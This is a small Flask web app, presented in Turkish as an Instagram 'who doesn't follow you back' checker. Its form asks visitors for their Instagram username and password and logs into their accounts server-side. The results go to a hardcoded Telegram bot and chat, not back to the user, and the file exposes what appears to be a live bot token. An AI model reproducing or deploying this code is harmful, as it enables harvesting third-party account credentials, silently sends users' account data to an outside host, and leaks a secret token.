from flask import Flask, request, render_template_string
from instagrapi import Client
import requests
import os

app = Flask(__name__)

HTML_FORM = """
<form method='POST' action='/login'>
    <input name='username' placeholder='Kullanıcı Adı' required><br>
    <input name='password' type='password' placeholder='Şifre' required><br>
    <button type='submit'>Giriş Yap</button>
</form>
"""

@app.route("/")
def home():
    return render_template_string(HTML_FORM)

@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username")
    password = request.form.get("password")

    cl = Client()
    try:
        cl.login(username, password)
        followers = cl.user_followers(cl.user_id)
        followings = cl.user_following(cl.user_id)
        not_following_back = [uid for uid in followings if uid not in followers]
        first_10 = not_following_back[:10]

        if first_10:
            message = "Seni takip etmeyen ilk 10 kişi:\n" + "\n".join([str(uid) for uid in first_10])
        else:
            message = "Herkes seni geri takip ediyor!"

        requests.post(
            "https://api.telegram.org/bot7825440621:AAEliR6YjokHUbmNhh_qFZflx0JYcK6S5bg/sendMessage",
            data={"chat_id": "6642524834", "text": message}
        )

        return "Telegram'a gönderildi."

    except Exception as e:
        return f"HATA: {str(e)}"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)